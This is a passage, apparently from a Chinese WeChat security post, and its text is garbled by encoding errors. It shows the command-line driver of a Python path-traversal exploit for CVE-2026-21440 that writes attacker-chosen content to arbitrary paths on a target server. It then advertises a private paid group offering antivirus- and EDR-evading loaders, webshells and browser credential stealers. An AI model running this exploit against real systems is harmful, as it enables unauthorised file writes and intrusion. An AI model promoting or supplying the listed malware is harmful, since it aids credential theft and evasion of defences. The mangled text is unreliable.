required=True,Â help='è¦éå†çš„ç›®æ ‡è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š../test.txtï¼‰')Â  Â  parser.add_argument('--content',Â '-c', default='CVE-2026-21440 PoC',Â help='è¦å†™å…¥æ–‡ä»¶çš„å†…å®¹')Â  Â  parser.add_argument('--file',Â '-f',Â help='ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–å†…å®¹')Â  Â  parser.add_argument('--timeout',Â '-t',Â type=int, default=10,Â help='è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼ˆå•ä½ï¼šç§’ï¼‰')Â  Â  parser.add_argument('--no-ssl-verify', action='store_true',Â help='å…³é—­SSLè¯ä¹¦éªŒè¯')Â  Â  parser.add_argument('--check', action='store_true',Â help='ä»…å¯¹ç›®æ ‡è¿›è¡Œæ¼æ´æ£€æŸ¥')Â  Â  parser.add_argument('--verbose',Â '-v', action='store_true',Â help='å¯ç”¨è¯¦ç»†è¾“å‡ºæ¨¡å¼')Â  Â  args = parser.parse_args()Â  Â Â print(BANNER)Â  Â Â # ç¡®å®šè¦å†™å…¥çš„å†…å®¹Â  Â  content = args.contentÂ  Â Â ifÂ args.file:Â  Â  Â  Â Â ifÂ os.path.exists(args.file):Â  Â  Â  Â  Â  Â Â withopen(args.file,Â 'r')Â asÂ f:Â  Â  Â  Â  Â  Â  Â  Â  content = f.read()Â  Â  Â  Â  Â  Â Â print(f"[*] å·²ä»æ–‡ä»¶åŠ è½½å†…å®¹ï¼š{args.file}")Â  Â  Â  Â Â else:Â  Â  Â  Â  Â  Â Â print(f"[!] æœªæ‰¾åˆ°æ–‡ä»¶ï¼š{args.file}")Â  Â  Â  Â  Â  Â  sys.exit(1)Â  Â Â # å®ä¾‹åŒ–æ¼æ´åˆ©ç”¨å¯¹è±¡Â  Â  exploit = PathTraversalExploit(Â  Â  Â  Â  target_url=args.url,Â  Â  Â  Â  timeout=args.timeout,Â  Â  Â  Â  verify_ssl=notÂ args.no_ssl_verifyÂ  Â  )Â  Â Â ifÂ args.check:Â  Â  Â  Â  sys.exit(0ifÂ exploit.check_target()Â else1)Â  Â Â print("[*] å¼€å§‹æ‰§è¡Œæ¼æ´åˆ©ç”¨...")Â  Â Â # æ‰§è¡Œæ¼æ´åˆ©ç”¨è¿‡ç¨‹Â  Â  success = exploit.exploit(args.path, content, args.verbose)Â  Â Â ifÂ success:Â  Â  Â  Â Â print("\n"Â +Â "="*60)Â  Â  Â  Â Â print("[+] æ¼æ´åˆ©ç”¨æˆåŠŸ - è¯·åœ¨ç›®æ ‡ç³»ç»Ÿä¸ŠéªŒè¯æ–‡ä»¶")Â  Â  Â  Â Â print("="*60)Â  Â  Â  Â  sys.exit(0)Â  Â Â else:Â  Â  Â  Â Â print("\n[-] æ¼æ´åˆ©ç”¨å¯èƒ½å¤±è´¥")Â  Â  Â  Â  sys.exit(1)ifÂ __name__ ==Â '__main__':Â  Â  main()
```  
  
å…³æ³¨å¾®ä¿¡å…¬ä¼—å·åå°å›å¤**å…¥ç¾¤**  
Â å³å¯åŠ å…¥æ˜Ÿå¤œAIå®‰å…¨äº¤æµç¾¤  
  
  
## åœˆå­ä»‹ç»  
  
ç°ä»»èŒäºæŸå¤´éƒ¨ç½‘ç»œå®‰å…¨ä¼ä¸šæ”»é˜²ç ”ç©¶éƒ¨ï¼Œæ ¸å¿ƒçº¢é˜Ÿæˆå‘˜ã€‚2021-2023å¹´é—´ç´¯è®¡å‚ä¸40+åœºå›½å®¶çº§ã€è¡Œä¸šçº§æ”»é˜²å®æˆ˜æ¼”ç»ƒï¼Œç²¾é€šæ¼æ´æŒ–æ˜ã€çº¢è“å¯¹æŠ—ç­–ç•¥åˆ¶å®šã€æ¶æ„ä»£ç åˆ†æã€å†…ç½‘æ¨ªå‘æ¸—é€åŠåº”æ€¥å“åº”ç­‰æŠ€æœ¯é¢†åŸŸã€‚åœ¨å¤šæ¬¡å¤§å‹æ¼”ç»ƒä¸­ï¼Œä¸»å¯¼çªç ´å¤šä¸ªé«˜é˜²æŠ¤ç›®æ ‡ç½‘ç»œï¼Œæ›¾è·â€œæœ€ä½³æ”»å‡»æ‰‹â€â€œçªå‡ºè´¡çŒ®ä¸ªäººâ€ç­‰è£èª‰ã€‚  
  
å·²äº§å‡ºçš„å®‰å…¨å·¥å…·åŠæˆæœåŒ…æ‹¬ï¼š  
- å¤šæ¬¾ä¸»æµæ€è½¯é€šæ€å·¥å…·ï¼ˆå…¼å®¹å¡å·´æ–¯åŸºã€è¯ºé¡¿ã€ç‘æ˜Ÿã€360ç­‰ç»ˆç«¯é˜²æŠ¤ï¼Œæ— æ„ŸçŸ¥è¿è¡Œï¼Œçªç ´å¤šå¼•æ“è”åˆæ£€æµ‹ï¼‰  
  
- XXByPassBehinder v1.1 å†°èå…æ€ç”Ÿæˆå™¨ï¼ˆå®šåˆ¶åŒ–å†°èå…æ€å·¥å…·ï¼Œç»•è¿‡ä¸»æµç»ˆç«¯é˜²æŠ¤ä¸EDRåŠ¨æ€æ£€æµ‹ï¼Œæ”¯æŒè‡ªå®šä¹‰è½½è·ï¼‰  
  
- å“¥æ–¯æ‹‰äºŒå¼€å…æ€å®šåˆ¶ç‰ˆï¼ˆäºŒå¼€ä¼˜åŒ–ï¼Œæ·±åº¦å…æ€ï¼Œçªç ´ç»ˆç«¯é˜²æŠ¤ä¸EDRæ£€æµ‹ï¼Œé€‚é…å¤šåœºæ™¯æ¤å…¥ï¼‰  
  
- NeoCS4.9ç»ˆæç‰ˆï¼ˆé«˜çº§å…æ€åŠ è½½å·¥å…·ï¼Œå¼ºåŒ–è½½è·æ³¨å…¥ä¸è¿›ç¨‹åŠ«æŒï¼Œé€‚é…å¤šç³»ç»Ÿç‰ˆæœ¬ï¼Œæ— å…¼å®¹é—®é¢˜ï¼‰  
  
- WinDump_å…æ€ç‰ˆï¼ˆæµè§ˆå™¨å‡­è¯çªƒå–å·¥å…·ï¼Œæ”¯æŒChrome/Edge/Firefoxç­‰ä¸»æµæµè§ˆå™¨ï¼Œä¸€é”®æå–æ•æ„Ÿæ•°æ®ï¼Œå…æ€è¿‡é˜²æŠ¤ï¼‰_  
  
- _DumpBrowser_V1_å…æ€ç‰ˆï¼ˆæµè§ˆå™¨å‡­è¯çªƒå–å·¥å…·ï¼Œä¸“æ”»æµè§ˆå™¨å¯†ç ã€Cookieã€å†å²è®°å½•æå–ï¼Œå…æ€æ€§èƒ½æ‹‰æ»¡ï¼‰  
  
- fscanäºŒå¼€ç‰ˆï¼ˆäºŒå¼€ä¼˜åŒ–å†…ç½‘æ‰«æå·¥å…·ï¼Œå¢å¼ºæŒ‡çº¹ç²¾åº¦ã€å¼±å£ä»¤çˆ†ç ´ä¸ç»“æœæ ‡å‡†åŒ–è¾“å‡ºï¼Œé€‚é…å¤æ‚å†…ç½‘ï¼‰  
  
- RingQåŠ è½½å™¨äºŒå¼€ç‰ˆï¼ˆäºŒå¼€ä¼˜åŒ–å…æ€åŠ è½½å™¨ï¼Œæ”¯æŒShellcodeå†…å­˜æ‰§è¡Œï¼Œç»•è¿‡å„ç±»ç»ˆç«¯é˜²æŠ¤ä¸EDRæ£€æµ‹ï¼‰  
  
- å¤šæ¬¾å…æ€Webshellé›†åˆï¼ˆè¦†ç›–PHP/JSP/ASPXï¼Œè¿‡ä¸»æµWAFä¸ç»ˆç«¯é˜²æŠ¤ï¼Œé€‚é…ä¸åŒWebåœºæ™¯ï¼‰  
  
- å…æ€360ä¸“å±åŠ è½½å™¨ï¼ˆæ”¯æŒShellcodeå†…å­˜æ‰§è¡Œï¼Œé’ˆå¯¹æ€§ç»•è¿‡360å…¨ç³»é˜²æŠ¤æ£€æµ‹ï¼Œæ— æ„ŸçŸ¥è¿è¡Œï¼‰  
  
åç»­å°†ä¸æ–­æ›´æ–°åˆ°å†…éƒ¨åœˆå­ä¸­ æ¬¢è¿åŠ å…¥åœˆå­Â ![image](https://mmbiz.qpic.cn/mmbiz_jpg/SffY5ZO3R2krPdiaNgcSCqIWicvYpFwAA7FE1OiakOmrjja9AwwXl1WnW18bKaykVfzXKCz7PVBmiaLI5JRZYncJMQ/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "image")  
  
### å¼•ç”¨é“¾æ¥  
  
[1]  
https://github.com/k0nnect/cve-2026-21440-writeup-poc.git  
  
[2]  
http://localhost:3333  
  
